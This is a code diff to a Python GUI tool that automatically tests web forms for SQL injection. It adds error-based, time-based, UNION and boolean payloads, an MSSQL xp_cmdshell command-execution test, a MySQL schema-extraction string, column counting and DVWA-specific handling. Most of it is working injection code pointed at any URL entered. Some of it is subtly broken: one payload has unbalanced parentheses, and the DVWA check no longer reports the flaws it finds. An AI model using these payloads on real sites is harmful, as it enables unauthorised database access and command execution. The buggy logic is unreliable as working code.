@@ -20,18 +20,50 @@ def debug_log(message):
     log_text.insert(tk.END, f"{message}\n")
     log_text.yview(tk.END)
 
-# Enhanced Payload Database
 PAYLOADS = {
     'error_based': [
-        ("'", "Universal quote test"),
-        ("') OR 1=1-- -", "MySQL boolean"),
-        ("' OR 1=1; EXEC xp_cmdshell('ping 127.0.0.1')--", "MSSQL RCE"),
-        ("'||(SELECT 1 FROM dual)--", "Oracle test")
+        # Universal
+        ("'", "Basic quote test"),
+        ("') OR 1=1-- -", "Boolean bypass"),
+        
+        # MySQL
+        ("' AND GTID_SUBSET(CONCAT(0x71787871,(SELECT MID((IFNULL(CAST(schema_name AS NCHAR),0x20)),0x71787871), 1)-- -", "MySQL schema extraction"),
+        
+        # MSSQL
+        ("'; EXEC xp_cmdshell('ping 127.0.0.1')--", "MSSQL RCE test"),
+        
+        # PostgreSQL
+        ("'||(SELECT CAST(current_database() AS NUMERIC))--", "PostgreSQL type conversion")
     ],
+    
     'time_based': [
+        # MySQL
         ("' OR SLEEP(5)-- -", "MySQL delay"),
-        ("'||pg_sleep(5)--", "PostgreSQL delay"),
-        ("'; WAITFOR DELAY '0:0:5'--", "MSSQL delay")
+        
+        # MSSQL
+        ("'; WAITFOR DELAY '0:0:5'--", "MSSQL delay"),
+        
+        # PostgreSQL
+        ("'||pg_sleep(5)--", "PostgreSQL delay")
+    ],
+    
+    'union': [
+        # Generic
+        ("' UNION SELECT NULL-- -", "Basic union test"),
+        
+        # MySQL
+        ("' UNION SELECT NULL,@@version-- -", "MySQL version"),
+        
+        # MSSQL
+        ("' UNION SELECT NULL,@@version,1-- -", "MSSQL version"),
+        
+        # PostgreSQL
+        ("' UNION SELECT NULL,version()-- -", "PostgreSQL version")
+    ],
+    
+    'boolean': [
+        ("' OR 'a'='a'-- -", "Basic always-true"),
+        ("admin'-- -", "Comment bypass")
     ]
 }
 
@@ -119,10 +151,15 @@ class SQLiTester:
             debug_log(f"Security setting error: {str(e)}")
 
     def test_form(self, form_url, method, inputs):
-        try:            
+        try:
             debug_log(f"\n=== Testing form: {form_url} ===")
             debug_log(f"Method: {method} | Inputs: {inputs}")
-            
+    
+            # First check for DVWA-specific form
+            if 'dvwa/vulnerabilities/sqli' in form_url:
+                debug_log("Detected DVWA SQLi form, using direct injection")
+                return self.test_dvwa_sqli_form(form_url, method, inputs)
+    
             # Get fresh form state
             try:
                 response = self.session.get(form_url, verify=False, timeout=10)
@@ -131,12 +168,12 @@ class SQLiTester:
             except Exception as e:
                 debug_log(f"Form fetch failed: {str(e)}")
                 return False
-
+    
             form = soup.find('form')
             if not form:
                 debug_log("No form found in response")
                 return False
-
+    
             # Build base data with CSRF handling
             base_data = {}
             inputs_list = [i.strip() for i in inputs.split(',')]
@@ -150,59 +187,84 @@ class SQLiTester:
                 elif name in inputs_list:
                     base_data[name] = '1'  # Safe value
                     debug_log(f"Found input field: {name}")
-
-            # Test payloads
+    
+            # Test all payload types
             for payload_type in PAYLOADS:
-                for payload, description in PAYLOADS[payload_type]:
-                    try:
-                        debug_log(f"\n=== Testing form: {form_url} ===")
-                        debug_log(f"Method: {method} | Inputs: {inputs}")
-                        if 'dvwa/vulnerabilities/sqli' in form_url:
-                            debug_log("Detected DVWA SQLi form, using direct injection")
-                            return self.test_dvwa_sqli_form(form_url, method, inputs)
-                        test_data = base_data.copy()
-                        for field in inputs_list:
-                            if field in test_data and field not in [k for k,v in base_data.items() if v]:
-                                test_data[field] = payload
-                                debug_log(f"Injected {field} with payload")
-
-                        debug_log(f"Final test data: {test_data}")
-                        
-                        if method == 'get':
-                            response = self.session.get(
-                                form_url, 
-                                params=test_data, 
-                                timeout=15
-                            )
-                        else:
-                            response = self.session.post(
-                                form_url, 
-                                data=test_data, 
-                                timeout=15
-                            )
-                        
-                        debug_log(f"Response: {response.status_code} in {response.elapsed.total_seconds():.2f}s")
-                        debug_log(f"Content snippet: {response.text[:200]}...")
-                        
-                        if self.is_vulnerable(response, payload_type):
-                            debug_log(f"!!! VULNERABILITY FOUND: {payload_type}")
-                            self.vulnerabilities.append({
-                                'url': form_url,
-                                'payload': payload,
-                                'type': payload_type,
-                                'confidence': 'High' if payload_type == 'error_based' else 'Medium'
-                            })
-                            return True
+                debug_log(f"\n=== Testing {payload_type.upper()} payloads ===")
+                
+                # Special handling for UNION-based
+                if payload_type == 'union':
+                    col_count = self.detect_columns(form_url, method)
+                    if col_count == 0:
+                        debug_log("Union testing skipped (no columns found)")
+                        continue
+                    
+                    for payload, description in PAYLOADS[payload_type]:
+                        try:
+                            # Replace NULL placeholders with actual column count
+                            modified_payload = payload.replace("NULL", "NULL,"*(col_count-1)+"NULL")
+                            test_data = base_data.copy()
                             
-                    except requests.exceptions.Timeout:
-                        debug_log("Timeout occurred during request")
-                    except Exception as e:
-                        debug_log(f"Payload test error: {traceback.format_exc()}")
-            
+                            # Inject into all fields
+                            for field in inputs_list:
+                                if field in test_data:
+                                    test_data[field] = modified_payload
+                                    debug_log(f"Injected {field} with UNION payload")
+    
+                            debug_log(f"Testing UNION payload: {modified_payload}")
+                            
+                            if method == 'get':
+                                response = self.session.get(form_url, params=test_data, timeout=15)
+                            else:
+                                response = self.session.post(form_url, data=test_data, timeout=15)
+                                
+                            if self.is_vulnerable(response, payload_type):
+                                self.vulnerabilities.append({
+                                    'url': form_url,
+                                    'payload': modified_payload,
+                                    'type': payload_type,
+                                    'confidence': 'High'
+                                })
+                                return True
+                                
+                        except Exception as e:
+                            debug_log(f"Union test error: {traceback.format_exc()}")
+                
+                # Regular payload testing
+                else:
+                    for payload, description in PAYLOADS[payload_type]:
+                        try:
+                            test_data = base_data.copy()
+                            for field in inputs_list:
+                                if field in test_data:
+                                    test_data[field] = payload
+                                    debug_log(f"Injected {field} with {payload_type} payload")
+    
+                            debug_log(f"Testing {payload_type} payload: {payload}")
+                            
+                            if method == 'get':
+                                response = self.session.get(form_url, params=test_data, timeout=15)
+                            else:
+                                response = self.session.post(form_url, data=test_data, timeout=15)
+                                
+                            if self.is_vulnerable(response, payload_type):
+                                self.vulnerabilities.append({
+                                    'url': form_url,
+                                    'payload': payload,
+                                    'type': payload_type,
+                                    'confidence': 'High' if payload_type == 'error_based' else 'Medium'
+                                })
+                                return True
+                                
+                        except Exception as e:
+                            debug_log(f"{payload_type} test error: {traceback.format_exc()}")
+    
             return False
+    
         except Exception as e:
             debug_log(f"Form test error: {traceback.format_exc()}")
-            return False
+            return False        
+
         
     def test_dvwa_sqli_form(self, form_url, method, inputs):
         """Special handler for DVWA's SQLi form"""
@@ -237,15 +299,16 @@ class SQLiTester:
                 debug_log("Significant content difference detected")
                 vuln_detected = True
 
+            # In test_dvwa_sqli_form()
             if vuln_detected:
-                debug_log("!!! VULNERABILITY FOUND: boolean_based")
+                vuln_type = 'boolean'  # or 'union'/'error' based on actual criteria
+                debug_log(f"!!! VULNERABILITY FOUND: {vuln_type}")
                 self.vulnerabilities.append({
                     'url': form_url,
                     'payload': test_data['id'],
-                    'type': 'boolean',
+                    'type': vuln_type,  # Dynamic typing
                     'confidence': 'High'
                 })
-                return True
 
             return False
         except Exception as e:
@@ -254,27 +317,60 @@ class SQLiTester:
             
     def is_vulnerable(self, response, payload_type):
         try:
-            content = response.text
+            content = response.text.lower()
+            headers = str(response.headers).lower()
 
+            # Error-based detection
             if payload_type == 'error_based':
-                return any(error in content.lower() for error in [
-                    'sql syntax', 'unclosed quotation', 'warning: mysql'
-                ])
+                error_patterns = {
+                    'mysql': r"sql syntax.*mysql|warning.*mysql",
+                    'mssql': r"unclosed quotation|microsoft ole db provider",
+                    'postgresql': r"pg_exec|postgresql"
+                }
+                for db, pattern in error_patterns.items():
+                    if re.search(pattern, content, re.DOTALL):
+                        debug_log(f"Detected {db} error")
+                        return True
+                return False
 
+            # Time-based detection    
             elif payload_type == 'time_based':
                 return response.elapsed.total_seconds() > 4
 
+            # Union-based detection
+            elif payload_type == 'union':
+                union_indicators = [
+                    'version()',  # PostgreSQL
+                    '@@version',  # MySQL/MSSQL
+                    'microsoft sql server',
+                    'mysql_fetch_array()',
+                    'pg_catalog'
+                ]
+                return any(indicator in content for indicator in union_indicators)
+
+            # Boolean-based detection
             elif payload_type == 'boolean':
-                # Generic boolean indicators
-                return any(marker in content.lower() for marker in [
-                    'welcome back', 'login success', 'user exists', 'admin'
-                ]) or "First name" in content  # DVWA-specific
+                return any(marker in content for marker in [
+                    'welcome back', 'login success', 
+                    'user exists', 'admin panel'
+                ])
 
             return False
         except Exception as e:
             debug_log(f"Vulnerability check error: {str(e)}")
             return False
 
+    def detect_columns(self, form_url, method):
+        """Determine number of columns using ORDER BY"""
+        debug_log("Detecting column count...")
+        for i in range(1, 15):
+            payload = f"' ORDER BY {i}-- -"
+            response = self.session.get(form_url, params={'id': payload})
+            if "Unknown column" in response.text:
+                return i-1
+        return 0
+    
+    
 def crawl_forms(url, session):
     try:
         debug_log(f"\nCrawling URL: {url}")
@@ -381,17 +477,17 @@ def generate_report():
     filename = f"SQLi_Report_{datetime.now().strftime('%Y%m%d_%H%M')}.pdf"
     
     try:
-        pdf = FPDF()
+        pdf = FPDF()  # Initialize FIRST
         pdf.add_page()
         pdf.set_font("Arial", size=12)
         
-        # Report header
+        # Header
         pdf.cell(200, 10, txt="SQL Injection Scan Report", ln=1, align='C')
         pdf.cell(200, 10, txt=f"Scanned URL: {url_entry.get()}", ln=1)
         pdf.cell(200, 10, txt=f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M')}", ln=1)
         pdf.ln(10)
         
-        # Vulnerabilities section
+        # Vulnerabilities
         pdf.set_fill_color(200, 220, 255)
         pdf.cell(200, 10, txt=f"Found {len(vulnerabilities)} vulnerabilities:", ln=1, fill=True)
         
@@ -399,7 +495,7 @@ def generate_report():
             pdf.multi_cell(0, 10, txt=f"""
             Vulnerability #{idx}
             URL: {vuln['url']}
-            Type: {vuln['type'].title()}-Based
+            Type: {vuln['type'].title()}
             Payload: {vuln['payload']}
             Confidence: {vuln['confidence']}
             """, border=1)
@@ -407,8 +503,12 @@ def generate_report():
         
         pdf.output(filename)
         messagebox.showinfo("Success", f"Report saved as {filename}")
+        
     except Exception as e:
-        messagebox.showerror("Error", f"Failed to generate report: {str(e)}")
+        error_msg = f"Failed to generate report: {str(e)}"
+        if 'pdf' in locals():  # Only if PDF was partially created
+            error_msg += f"\nPartial file: {filename}"
+        messagebox.showerror("Error", error_msg)
 
 # GUI Setup
 root = tk.Tk()
